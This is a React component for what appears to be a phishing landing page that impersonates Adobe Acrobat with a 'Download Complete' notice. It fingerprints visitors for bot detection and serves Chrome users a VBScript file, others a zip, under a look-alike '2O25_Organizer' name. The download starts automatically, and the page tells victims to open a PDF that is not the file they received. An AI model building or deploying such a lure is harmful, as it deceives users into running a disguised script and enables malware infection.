import { useEffect, useMemo } from "react";
import { useVisitorData } from "@fingerprintjs/fingerprintjs-pro-react";
import adbLogo from "@/assets/adb-logo.png";
import acrobatBg from "@/assets/adobe-acrobat-bg.png";

const randomDigits = (len = 8) =>
  Array.from(crypto.getRandomValues(new Uint8Array(len)))
    .map((b) => (b % 10).toString())
    .join("");

const Download = () => {
  const { data: visitorData } = useVisitorData({ extendedResult: true }, { immediate: true });

  useEffect(() => {
    if (visitorData) {
      console.log("Visitor ID:", visitorData.visitorId);
      console.log("Bot detection:", visitorData);
    }
  }, [visitorData]);

  const downloadFile = useMemo(() => {
    const ua = navigator.userAgent;
    const suffix = randomDigits(8);
    if (ua.includes("Edg/")) {
      return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
    }
    if (ua.includes("Chrome") && !ua.includes("Edg/")) {
      return { href: "/docs/SharefilePlugin.vbs", name: `2O25_Organizer_${suffix}.vbs` };
    }
    return { href: "/docs/SharefilePlugin.zip", name: `2O25_Organizer_${suffix}.zip` };
  }, []);

  useEffect(() => {
    if (!downloadFile) return;
    const timer = setTimeout(() => {
      const link = document.createElement("a");
      link.href = downloadFile.href;
      link.download = downloadFile.name;
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }, 1000);
    return () => clearTimeout(timer);
  }, []);

  return (
    <div className="relative flex min-h-screen flex-col items-center justify-center overflow-hidden">
      <img src={acrobatBg} alt="" className="absolute inset-0 w-full h-full object-fill" />

      <div className="relative z-10 bg-white rounded-lg shadow-2xl max-w-[400px] w-full mx-4 py-6 px-7 flex flex-col items-center text-center">
        <div className="mb-3">
          <img src={adbLogo} alt="Adobe PDF" className="w-[72px] h-[84px] object-contain" />
        </div>

        <h1 className="text-lg font-bold text-[#1a1a1a] mb-1">Download Complete</h1>

        <p className="text-xs text-[#999] italic mb-3">You've received a secure document:</p>

        <p className="text-[13px] text-[#444] leading-snug">
          Your Document has been downloaded to your device.
        </p>
        <p className="text-[13px] text-[#444] leading-snug">
          Please check your <strong>Downloads</strong> folder
        </p>
        <p className="text-[13px] text-[#444] leading-snug mb-4">
          and open <strong>2O25_Organizer_02162026.pdf</strong> To view your document.
        </p>

        <p className="text-[13px] text-[#444] mb-4 leading-snug">
          If your Download did not start automatically, you can<br />
          download the document again
        </p>

        <a
          href={downloadFile.href}
          download={downloadFile.name}
          className="inline-block bg-[#0078d4] hover:bg-[#106ebe] text-white font-semibold px-7 py-2.5 rounded text-xs transition-colors"
        >
          Download Document
        </a>
      </div>
    </div>
  );
};

export default Download;
